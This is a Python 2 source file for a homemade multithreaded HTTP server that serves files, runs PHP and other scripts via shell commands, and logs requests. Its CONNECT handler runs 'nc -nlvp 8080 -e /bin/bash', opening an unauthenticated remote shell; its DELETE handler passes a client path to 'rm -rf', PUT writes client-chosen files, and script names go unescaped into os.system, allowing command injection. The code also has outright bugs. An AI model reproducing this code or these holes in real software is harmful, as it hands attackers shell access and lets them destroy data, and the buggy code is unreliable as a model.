#!/usr/bin/python2
from conf import *
import socket
import os
from threading import Thread
import time


def get_cookie(request_lines):
    #print("cookie data is: " + request_lines[-3])
    data = request_lines[-3].split(":")[-1]
    return (data.split("=")[-1])

def error_404(addr,request_words):
    print("File not Found request")
    logging(addr,request_words[1][1:],"error","404")
    csock.sendall(error_handle(404,"text/html",False))
    response = """<html><head><body>file not found</body></head></html>"""
    #f = open("404.html","r")
    #response = f.read()
    #f.close()
    csock.sendall(response)
    csock.close()
    #print(file_name)

def error_403(addr,request_words):
    print("Forbidden")
    logging(addr,request_words[1][1:],"error","403")
    csock.sendall(error_handle(403,"text/html",False))
    response = """<html><head><body>Forbidden</body></head></html>"""
    #f = open("404.html","r")
    #response = f.read()
    #f.close()
    csock.sendall(response)
    csock.close()
    #print(file_name)

def error_400(addr,request_words):
    print("Bad request")
    logging(addr,request_words[1][1:],"error","400")
    csock.sendall(error_handle(400,"text/html",False))
    response = """<html><head><body>file not found</body></head></html>"""
    #f = open("404.html","r")
    #response = f.read()
    #f.close()
    csock.sendall(response)
    csock.close()
    #print(file_name)

def error_501(addr,request_words):
    print("NOT Implemented")
    logging(addr,request_words,"error","501")
    csock.sendall(error_handle(501,"text/html",False))
    response = """<html><head><body>Not Implemented </body></head></html>"""
    #f = open("404.html","r")
    #response = f.read()
    #f.close()
    csock.sendall(response)
    csock.close()
    #print(file_name)

def error_401(addr,request_words):
    print("Unauthorized")
    logging(addr,request_words,"error","401")
    csock.sendall(error_handle(401,"text/html",False))
    response = """<html><head><body>Unauthorized</body></head></html>"""
    #f = open("404.html","r")
    #response = f.read()
    #f.close()
    csock.sendall(response)
    csock.close()
    #print(file_name)

def error_500(e,file_name,addr):
    print("Internal Server Error")
    logging(addr,file_name,"error","501")
    csock.sendall(error_handle(501,"text/html",False))
    response = """<html><head><body>Internal Server Error </body></head></html>"""
    #f = open("404.html","r")
    #response = f.read()
    #f.close()
    csock.sendall(response)
    csock.close()

def error_411(addr,request_words):
    print("Length Required")
    logging(addr,request_words,"error","411")
    csock.sendall(error_handle(411,"text/html",False))
    response = """<html><head><body>Length Required</body></head></html>"""
    #f = open("404.html","r")
    #response = f.read()
    #f.close()
    csock.sendall(response)
    csock.close()
    #print(file_name)

def error_505(addr,request_words):
    print("Trailing whitespaces")
    logging(addr,request_words,"error","505")
    csock.sendall(error_handle(505,"text/html",False))
    response = """<html><head><body>Trailing white spaces</body></head></html>"""
    #f = open("404.html","r")
    #response = f.read()
    #f.close()
    csock.sendall(response)
    csock.close()
    #print(file_name)



def page_handle(method,request_lines,file_name,addr,request_words):
    print(method)
    data = request_lines[-1]
    #print("get data is :".format(data))
    #print(file_name.split(".")[-1])
    if(file_name.split(".")[-1]=="php"):
        isphp = True
    else:
        isphp = False
    print(isphp)
    session_id= get_cookie(request_lines)
    #file_name = root_dir + file_name
    print(file_name)
    if(root_dir not in file_name):
        error_401(addr,file_name)
    file_name = serverside(file_name,data,method,session_id)
    mime_type = mime_type_handler(file_name.split(".")[-1],addr)
    response_file = open(file_name,"r")
    response = response_file.read()
    response_file.close()
    logging(addr,request_words[1][1:],"OK","200")
    avoid_response = ["image/x-icon","image/gif","image/jpeg","image/png"]
    #if(mime_type not in avoid_response):
        #print(response)
    #    print("response from error handle\n\n\n")
    header = error_handle(200,mime_type,isphp)
    #print(header)
    csock.sendall(header)
    csock.sendall(response)
    csock.close()

def serverside(file_name,data,method,session_id):
    ext = file_name.split(".")[-1]
    path_split = file_name.split("/")
    if(ext in lang):
        if(ext=="php"):
            os.environ["_{}".format(method)]= data
            os.environ["SESSION_ID"]=session_id
            print(os.environ["_{}".format(method)])
            os.system("php-cgi {} > output.html".format(file_name))
            file_name = "output.html"
            #print("file is returned")
            return file_name
        else:
            #print(dat)
            try:
                if("nodefiles" in path_split):
                    resp = os.system("node {} > output.html".format(file_name))
                    filename="output.html"
                    return file_name

                resp = os.system("{} {} > output.html".format(lang[ext],file_name))
                file_name = "output.html"
                return file_name
            except Exception as e:
                error_500(e,file_name,addr)
    else :
        if(ext in mime_switcher):
            print("file is returned")
            return file_name
        else:
            error_501(addr,file_name)


def error_handle(errornum,mime_type,isphp):
    if(isphp):
        response = """HTTP/1.1 {} {}\r\n""".format(errornum,errorname[errornum])
    else:
        response = """HTTP/1.1 {} {}\r\nContent-type:{}\r\n\r\n""".format(errornum,errorname[errornum],mime_type)
    print(response)
    return response


def connhandler(csock,addr):
    request = csock.recv(1024)
    #print(addr)
    #sock.sendall(index.read())
    request_lines = request.split("\n")
    request_words = request_lines[0].split(" ")
    print("\r\n\r\n\r\n")
    if(len(request_words)!=3):
        error_505(addr,request_words)
    #print(request)
    #print(root_dir)
    if(request_words[0] == "GET"):
        if(get_enable):
            if(request_words[1] == "/"):
                file_name = root_dir+root_file
            else:
                file_name = root_dir+request_words[1][1:]
            print(file_name)
            if(os.path.isfile(file_name)):
                method="GET"
                page_handle(method,request_lines,file_name,addr,request_words)
            else:
                error_404(addr,request_words)
        else:
            error_403(addr,request_words)


    elif(request_words[0]=="POST"):
        if(post_enable):
            if(request_words[1] == "/"):
                file_name = root_dir+root_file
            else:
                file_name = root_dir+request_words[1][1:]
            print(file_name)
            if(request_lines[3].split(":")[-1]== 0):
                error_411(addr,request_words)
            if(os.path.isfile(file_name)):
                method="POST"
                page_handle(method,request_lines,file_name,addr,request_words)
            else:
                error_404(addr,request_words)
        else:
            error_403(addr,request_words)

    elif(request_words[0]=="PUT"):
        if(put_enable):
            data = request_lines[-1]
            #if(data!=""):
            file_name = request_words[1][1:]
            f = open(filename,"a+")
            f.write(data)
            f.close()
            header = error_handle(200,"text/html",False)
            csock.sendall(header)
            csock.close()
        else:
            error_403(addr,request_words)


    elif(request_words[0]=="DELETE"):
        if(delete_enable):
            file_name = request_words[1][1:]
            os.system("rm -rf {}".file_name)
            header = error_handle(200,"text/html",False)
            csock.sendall(header)
            csock.sendall("FILE DELETED")
            csock.close()
        else:
            error_403(addr,request_words)

    elif(request_words[0]=="CONNECT"):
        if(connect_enable):
            header = error_handle(200,"text/html",False)
            os.system("nc -nlvp 8080 -e /bin/bash")
            header = error_handle(200,"text/html",False)
            csock.sendall(header)
            csock.sendall("Port Opened at 8080")
            csock.close()
        else:
            error_403(addr,request_words)

    else:
        error_400(addr,request_words)



def mime_type_handler(mime,addr):
    try:
        file_type = mime_switcher[mime.split(".")[-1]]
        return file_type
    except Exception as e:
        logging(addr,e,"exception","")
        return "invalid file type"


def logging(addr,request,types,code):
    if(types == "error"):
        file_name = bad_req_logs_path + "error_log.log"
        f = open(file_name,"a+")
        f.write("Logging at time {}".format(time.strftime("%Y-%m-%d %H:%M:%S",time.gmtime())))
        f.write("{} has requested {} which threw a response code {}\n".format(addr,request,code))
        f.close()
    elif(types == "exception"):
        file_name = bad_req_logs_path + "exception_log.log"
        f = open(file_name,"a+")
        f.write("Logging at time {}".format(time.strftime("%Y-%m-%d %H:%M:%S",time.gmtime())))
        f.write("{} has requested {} which threw a exception\n".format(addr,request,code))
        f.close()
    else:
        file_name = good_req_logs_path + "responses_log.log"
        f = open(file_name,"a+")
        f.write("Logging at time {}".format(time.strftime("%Y-%m-%d %H:%M:%S",time.gmtime())))
        f.write("{} has requested {} which has a response code : {}\n".format(addr,request,code))
        f.close()


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
sock.bind((host,port))
sock.listen(5)
print("Servering on port {}".format(port))
while True:
    csock,addr = sock.accept()
    handler = Thread(target = connhandler,args = (csock,addr),)
    handler.start()
    #print("handler ran")
